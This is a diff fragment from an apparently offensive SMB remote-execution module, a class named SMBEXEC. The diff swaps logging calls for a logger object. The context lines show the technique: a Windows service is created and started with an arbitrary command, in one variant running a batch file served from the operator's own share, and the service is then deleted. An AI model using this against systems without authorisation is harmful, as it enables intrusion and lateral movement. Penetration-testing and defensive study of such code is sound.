@@ -47,7 +47,7 @@ class SMBEXEC:
             self.__password = ''
 
         stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
-        logging.debug('StringBinding %s'%stringbinding)
+        logger.debug('StringBinding %s'%stringbinding)
         self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
         self.__rpctransport.set_dport(self.__port)
 
@@ -97,21 +97,21 @@ class SMBEXEC:
         with open(os.path.join('/tmp', 'cme_hosted', self.__batchFile), 'w') as batch_file:
             batch_file.write(command)
 
-        logging.debug('Hosting batch file with command: ' + command)
+        logger.debug('Hosting batch file with command: ' + command)
 
         #command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip,self.__share_name, self.__batchFile)
-        logging.debug('Command to execute: ' + command)
+        logger.debug('Command to execute: ' + command)
 
-        logging.debug('Remote service {} created.'.format(self.__serviceName))
+        logger.debug('Remote service {} created.'.format(self.__serviceName))
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
         service = resp['lpServiceHandle']
 
         try:
-            logging.debug('Remote service {} started.'.format(self.__serviceName))
+            logger.debug('Remote service {} started.'.format(self.__serviceName))
             scmr.hRStartServiceW(self.__scmr, service)
         except:
            pass
-        logging.debug('Remote service {} deleted.'.format(self.__serviceName))
+        logger.debug('Remote service {} deleted.'.format(self.__serviceName))
         scmr.hRDeleteService(self.__scmr, service)
         scmr.hRCloseServiceHandle(self.__scmr, service)
         self.get_output_remote()       
@@ -131,7 +131,7 @@ class SMBEXEC:
                     sleep(2)
                     pass
                 else:
-                    logging.debug(e)
+                    logger.debug(e)
                     pass
 
         self.__smbconnection.deleteFile(self.__share, self.__output) 
@@ -149,21 +149,21 @@ class SMBEXEC:
         with open(os.path.join('/tmp', 'cme_hosted', self.__batchFile), 'w') as batch_file:
             batch_file.write(command)
 
-        logging.debug('Hosting batch file with command: ' + command)
+        logger.debug('Hosting batch file with command: ' + command)
 
         command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip,self.__share_name, self.__batchFile)
-        logging.debug('Command to execute: ' + command)
+        logger.debug('Command to execute: ' + command)
 
-        logging.debug('Remote service {} created.'.format(self.__serviceName))
+        logger.debug('Remote service {} created.'.format(self.__serviceName))
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
         service = resp['lpServiceHandle']
 
         try:
-            logging.debug('Remote service {} started.'.format(self.__serviceName))
+            logger.debug('Remote service {} started.'.format(self.__serviceName))
             scmr.hRStartServiceW(self.__scmr, service)
         except:
            pass
-        logging.debug('Remote service {} deleted.'.format(self.__serviceName))
+        logger.debug('Remote service {} deleted.'.format(self.__serviceName))
         scmr.hRDeleteService(self.__scmr, service)
         scmr.hRCloseServiceHandle(self.__scmr, service)
         self.get_output_fileless()
